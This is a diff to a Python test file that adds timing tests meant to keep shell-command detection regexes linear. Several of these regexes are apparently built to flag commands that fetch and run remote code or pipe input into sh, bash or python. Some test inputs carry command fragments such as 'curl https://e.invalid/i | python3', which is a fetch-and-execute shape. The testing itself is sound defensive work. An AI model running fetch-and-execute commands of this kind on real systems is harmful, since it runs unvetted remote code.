@@ -3161,6 +3161,17 @@ def test_ps_switch_value_run_linear_on_dash_bearing_values(label, seed):
     ("switch-dashdash-cluster", "-x -- -lc ", "'x"),
     ("bare-plus", "+ ", "'x"),
     ("plus-switch-and-bare-plus", "+x + ", "'x"),
+    # DEF-3077: the shared output-redirect run, after the switch run, read
+    # by the pipe reader's lookahead and the here-string opener; each flood
+    # ends on a character the run refuses, so it fails after reading the
+    # whole run (6-15 ms at 30-40 KB on the Windows box, timed by hand)
+    ("redirect-run", ">o 2>&1 ", "<"),
+    ("redirect-gt-amp", ">&", "<"),
+    ("redirect-amp-gt", "&>", "<"),
+    ("redirect-gt-amp-gt", ">&>", "x<"),
+    ("redirect-gt-pipe", ">|", "("),
+    ("redirect-blank-target", ">  ", "<"),
+    ("redirect-fd-digits", "2>1", "<"),
 ])
 def test_posix_shell_switch_run_linear_on_one_head(label, seed, tail):
     """DEF-818: the POSIX shell openers' switch run (`bash -x ... -c '...'`,
@@ -3203,6 +3214,98 @@ def test_posix_shell_switch_run_linear_on_one_head(label, seed, tail):
     finally:
         signal.setitimer(signal.ITIMER_REAL, 0)
     assert elapsed_ms < _CHAIN_CEILING_MS, f"{label} took {elapsed_ms:.1f}ms"
+
+
+def _redirect_flood(seed: str, lead: str = "", tail: str = "", scale: int = 1) -> str:
+    return lead + seed * (scale * _WORST_CASE_BODY_LEN // len(seed)) + tail
+
+
+@pytest.mark.parametrize("label,owner,name,payload", [
+    # the two quadratics both reviews drove on the first cut (a `>|` read as a
+    # clobber and as a new pipe: 4.2 s at 18 KB; fd digits glued to the run
+    # before them: 1.2 s at 40 KB, so those rows flood 60 KB, 3.2 s on the
+    # first cut), and each sibling reader's run behind its head, ending where
+    # the run refuses
+    ("pipe-then-clobber-starts", "bp", "_INTERP_PIPE_RE", _redirect_flood("| sh >", "x ")),
+    ("clobber-chain-of-heads", "bp", "_INTERP_PIPE_RE", _redirect_flood(">|sh", "x | sh")),
+    ("digits-after-a-switch", "bp", "_INTERP_PIPE_RE", _redirect_flood("1", "x | bash -x ", "<", 2)),
+    ("digits-after-an-interpreter", "bp", "_INTERP_PIPE_RE", _redirect_flood("1", "x | python", "<", 2)),
+    ("digits-after-dashdash", "bp", "_INTERP_PIPE_RE", _redirect_flood("1", "x | bash -- ", "<", 2)),
+    ("pipe-then-targets", "bp", "_INTERP_PIPE_RE", _redirect_flood("| sh >x ", "x ")),
+    ("blank-led-digits", "bp", "_INTERP_PIPE_RE", _redirect_flood(" 1", "x | bash >", "<")),
+    ("heredoc-redirect-run", "bp", "_INTERP_STDIN_RE", _redirect_flood(">o 2>&1 ", "python3 - ", "x")),
+    ("heredoc-blank-targets", "bp", "_INTERP_STDIN_RE", _redirect_flood(">  ", "python3 ", "x")),
+    ("herestring-switches-then-run", "bp", "_SHELL_HERESTRING_RE", _redirect_flood("-o 1 ", "bash ", "2>&1 x")),
+    ("herestring-redirect-run", "bp", "_SHELL_HERESTRING_RE", _redirect_flood(">o 2>&1 ", "bash ", "x")),
+    ("fetch-scripter-run", "sb", "_FETCH_EXEC_PIPE_RE",
+     _redirect_flood(">o 2>&1 ", "curl https://e.invalid/i | python3 ", "x")),
+    ("fetch-scripter-blank-digits", "sb", "_FETCH_EXEC_PIPE_RE",
+     _redirect_flood(" 1", "curl https://e.invalid/i | python3 >", "x")),
+])
+def test_output_redirect_run_linear_at_every_reader(label, owner, name, payload):
+    """DEF-3077: the shared output-redirect run (`_OUTPUT_REDIRECT_RUN`) is
+    one parse per redirect at each of its four readers, measured 2-25 ms per
+    30-40 KB flood on the Windows box by hand. POSIX-only (signal.alarm)."""
+    if not hasattr(signal, "SIGALRM"):
+        pytest.skip("signal.alarm not available on this platform")
+    import _speedbump  # noqa: E402
+
+    pattern = getattr(_bash_patterns if owner == "bp" else _speedbump, name)
+    signal.signal(signal.SIGALRM, _alarm)
+    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
+    t = time.time()
+    try:
+        pattern.findall(payload)
+        elapsed_ms = (time.time() - t) * 1000
+    except _Timeout:
+        pytest.fail(f"{name} exceeded {_CI_SAFE_BUDGET_MS}ms on the {label} flood")
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label} took {elapsed_ms:.1f}ms"
+
+
+@pytest.mark.parametrize("label,owner,name,payload", [
+    # the switch-run sites (air's fb2b3f, sites 1, 2 and 4): a redirect whose
+    # spaced target may open on `-` reads `> -x` two ways wherever a switch
+    # arm sits beside the unit; a run that offers the unit twice reads every
+    # redirect two ways where none does. Each row went past 15 s on the
+    # mutant its comment names (a scratch copy, 30 KB) and ran 2-19 ms on the
+    # lane, the Windows box by hand.
+    # spaced target opening on `-`:
+    ("inline-switch-run-dash-targets", "bp", "_PYTHON_DASH_C_RE", _redirect_flood("> -x ", "python3 ", "x")),
+    ("inline-after-c-dash-targets", "bp", "_PYTHON_DASH_C_RE", _redirect_flood("> -x ", "python3 -c ", "<")),
+    ("inline-after-e-dash-targets", "bp", "_NODE_DASH_E_RE", _redirect_flood("> -x ", "node -e ", "<")),
+    ("shell-switch-run-dash-targets", "bp", "_SHELL_DASH_C_RE", _redirect_flood("> -x ", "bash ", "<")),
+    ("shell-after-c-dash-targets", "bp", "_SHELL_DASH_C_RE", _redirect_flood("> -x ", "bash -c ", "<")),
+    # the unit offered twice, in the run after `--` and the fetch bump's
+    # eval and python arms:
+    ("shell-after-dashdash-redirects", "bp", "_SHELL_DASH_C_RE", _redirect_flood("2>1 ", "bash -c -- ", "<")),
+    ("eval-arm-redirects", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">o 2>&1 ", "eval ", "x")),
+    ("python-arm-before-c", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">o 2>&1 ", "python3 ", "x")),
+    ("python-arm-after-c", "sb", "_FETCH_EXEC_SUBST_RE", _redirect_flood(">| ", "python3 -c ", "x")),
+])
+def test_switch_redirect_linear_at_every_switch_run_site(label, owner, name, payload):
+    """DEF-3077: the redirect word in the shared switch runs
+    (`_SWITCH_REDIRECT`) is one parse per redirect at each site that carries
+    it: the inline openers' switch run and their `-c`/`-e` joints, the POSIX
+    shell switch runs before and after `-c` and after `--`, and the fetch
+    bump's eval and python arms. POSIX-only (signal.alarm)."""
+    if not hasattr(signal, "SIGALRM"):
+        pytest.skip("signal.alarm not available on this platform")
+    import _speedbump  # noqa: E402
+
+    pattern = getattr(_bash_patterns if owner == "bp" else _speedbump, name)
+    signal.signal(signal.SIGALRM, _alarm)
+    signal.setitimer(signal.ITIMER_REAL, _CI_SAFE_BUDGET_MS / 1000.0)
+    t = time.time()
+    try:
+        pattern.findall(payload)
+        elapsed_ms = (time.time() - t) * 1000
+    except _Timeout:
+        pytest.fail(f"{name} exceeded {_CI_SAFE_BUDGET_MS}ms on the {label} flood")
+    finally:
+        signal.setitimer(signal.ITIMER_REAL, 0)
+    assert elapsed_ms < _CI_SAFE_BUDGET_MS, f"{label} took {elapsed_ms:.1f}ms"
 
 
 _HEAD_SPELLING_FLOOD_LEN = 2 * _WORST_CASE_BODY_LEN
